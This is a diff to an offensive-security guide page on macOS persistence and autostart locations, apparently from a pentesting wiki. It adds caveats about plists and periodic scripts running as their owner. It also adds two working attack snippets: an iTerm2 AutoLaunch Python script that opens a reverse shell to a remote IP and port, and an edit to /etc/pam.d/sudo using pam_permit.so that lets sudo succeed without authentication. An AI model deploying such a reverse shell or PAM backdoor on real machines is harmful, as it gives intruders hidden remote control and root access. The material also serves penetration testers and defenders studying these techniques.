@@ -94,6 +94,10 @@ List all the agents and daemons loaded by the current user:
 launchctl list
 ```
 
+{% hint style="warning" %}
+If a plist is owned by a user, even if it's in a daemon system wide folders, the **task will be executed as the user** and not as root. This can prevent some privilege escalation attacks.
+{% endhint %}
+
 ### shell startup files
 
 Writeup: [https://theevilbit.github.io/beyond/beyond\_0001/](https://theevilbit.github.io/beyond/beyond\_0001/)\
@@ -437,6 +441,25 @@ touch /tmp/iterm2-autolaunch
 EOF
 
 chmod +x "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.sh"
+```
+
+or:
+
+```bash
+cat > "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.py" << EOF
+#!/usr/bin/env python3
+import iterm2,socket,subprocess,os
+
+async def main(connection):
+    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('10.10.10.10',4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['zsh','-i']);
+    async with iterm2.CustomControlSequenceMonitor(
+            connection, "shared-secret", r'^create-window$') as mon:
+        while True:
+            match = await mon.async_get()
+            await iterm2.Window.async_create(connection)
+
+iterm2.run_forever(main)
+EOF
 ```
 
 The script **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`** will also be executed:
@@ -972,7 +995,7 @@ Writeup: [https://posts.specterops.io/saving-your-access-d562bf5bf90b](https://p
 * `~/Library/Screen Savers`
   * **Trigger**: Select the screen saver
 
-<figure><img src="../.gitbook/assets/image (1) (1) (1) (1).png" alt="" width="375"><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1).png" alt="" width="375"><figcaption></figcaption></figure>
 
 #### Description & Exploit
 
@@ -1243,6 +1266,10 @@ monthly_local="/etc/monthly.local"			# Local scripts
 
 If you manage to write any of the files `/etc/daily.local`, `/etc/weekly.local` or `/etc/monthly.local` it will be **executed sooner or later**.
 
+{% hint style="warning" %}
+Note that the periodic script will be **executed as the owner of the script**. So if a regular user owns the script, it will be executed as that user (this might prevent privilege escalation attacks).
+{% endhint %}
+
 ### PAM
 
 Writeup: [Linux Hacktricks PAM](../linux-hardening/linux-post-exploitation/pam-pluggable-authentication-modules.md)\
@@ -1258,6 +1285,37 @@ Writeup: [https://theevilbit.github.io/beyond/beyond\_0005/](https://theevilbit.
 #### Description & Exploitation
 
 As PAM is more focused in **persistence** and malware that on easy execution inside macOS, this blog won't give a detailed explanation, **read the writeups to understand this technique better**.
+
+Check PAM modules with:&#x20;
+
+```bash
+ls -l /etc/pam.d
+```
+
+A persistence/privilege escalation technique abusing PAM is as easy as modifying the module /etc/pam.d/sudo adding at the beginning the line:
+
+```bash
+auth       sufficient     pam_permit.so
+```
+
+So it will **looks like** something like this:
+
+```bash
+# sudo: auth account password session
+auth       sufficient     pam_permit.so
+auth       include        sudo_local
+auth       sufficient     pam_smartcard.so
+auth       required       pam_opendirectory.so
+account    required       pam_permit.so
+password   required       pam_deny.so
+session    required       pam_permit.so
+```
+
+And therefore any attempt to use **`sudo` will work**.
+
+{% hint style="danger" %}
+Note that this directory is protected by TCC so it's higly probably that the user will get a prompt asking for access.
+{% endhint %}
 
 ### Authorization Plugins
 
